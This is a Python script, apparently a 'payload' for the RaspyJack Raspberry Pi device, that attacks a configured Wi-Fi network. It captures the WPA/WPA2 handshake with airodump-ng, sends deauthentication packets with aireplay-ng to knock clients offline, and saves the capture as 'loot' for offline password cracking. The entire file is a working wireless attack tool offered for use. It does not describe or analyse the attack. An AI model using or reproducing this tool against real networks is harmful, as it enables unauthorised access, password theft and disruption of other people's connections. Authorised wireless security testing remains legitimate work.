#!/usr/bin/env python3
"""
RaspyJack *payload* – **WiFi: WPA Handshake Capture**
======================================================
A payload that uses `airodump-ng` to capture the WPA/WPA2 4-way
handshake for a specific target network.

The captured handshake is saved to a .cap file in the loot directory,
which can then be cracked offline using tools like aircrack-ng or
hashcat. This payload can optionally send deauth packets to speed
up the process by forcing a client to reconnect.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
WIFI_INTERFACE = "wlan1mon" # Must be in monitor mode
TARGET_BSSID = "00:11:22:33:44:55"
TARGET_CHANNEL = "6"
TARGET_ESSID = "MyHomeWiFi"
SEND_DEAUTH = True # Set to True to actively deauth clients
LOOT_DIR = "/root/Raspyjack/loot/Handshakes/"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
attack_thread = None
status_msg = "Press OK to start"

def cleanup(*_):
    global running
    running = False
    if attack_thread:
        try: os.kill(attack_thread.pid, signal.SIGTERM)
        except: pass

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Handshake Capture", font=FONT_TITLE, fill="#FFC300")
    d.line([(0, 22), (128, 22)], fill="#FFC300", width=1)
    d.text((5, 30), f"Target: {TARGET_ESSID[:16]}", font=FONT)
    d.text((10, 50), status_msg, font=FONT, fill="yellow")
    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# --- Attacker ---
def run_attack():
    global status_msg
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d_%H%M%S")
    output_prefix = os.path.join(LOOT_DIR, f"handshake_{TARGET_ESSID.replace(' ', '_')}_{timestamp}")
    
    status_msg = "Listening..."
    
    try:
        # Command to run airodump-ng
        command = f"airodump-ng --bssid {TARGET_BSSID} -c {TARGET_CHANNEL} -w {output_prefix} {WIFI_INTERFACE}"
        
        global attack_thread
        attack_thread = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Optional deauth thread
        deauth_proc = None
        if SEND_DEAUTH:
            deauth_cmd = f"aireplay-ng -0 5 -a {TARGET_BSSID} {WIFI_INTERFACE}"
            deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Monitor for the handshake file
        cap_file = f"{output_prefix}-01.cap"
        start_time = time.time()
        while time.time() - start_time < 120: # 2 minute timeout
            if not running: break
            status_msg = f"Listening... {int(time.time() - start_time)}s"
            if os.path.exists(cap_file):
                # Use aircrack-ng to check if the cap file has a handshake
                check_cmd = f"aircrack-ng {cap_file} | grep '1 handshake'"
                if subprocess.run(check_cmd, shell=True, capture_output=True).returncode == 0:
                    status_msg = "Handshake captured!"
                    return
            time.sleep(2)

        status_msg = "Timeout reached."

    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Airodump attack failed: {e}", file=sys.stderr)
    finally:
        if attack_thread: attack_thread.terminate()
        if deauth_proc: deauth_proc.terminate()


# --- Main Loop ---
try:
    if "mon" not in subprocess.check_output(f"iwconfig {WIFI_INTERFACE}", shell=True, text=True):
        status_msg = "Not in Monitor Mode!"
        draw_ui()
        time.sleep(3)
        raise SystemExit("Interface not in monitor mode.")

    while running:
        draw_ui()
        
        if GPIO.input(PINS["KEY3"]) == 0:
            cleanup()
            break
        
        if GPIO.input(PINS["OK"]) == 0:
            threading.Thread(target=run_attack, daemon=True).start()
            time.sleep(0.3)
            # Wait for thread to finish or key press
            while status_msg not in ["Handshake captured!", "Timeout reached.", "Attack failed!"]:
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                time.sleep(1)
        
        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Handshake Capture payload finished.")
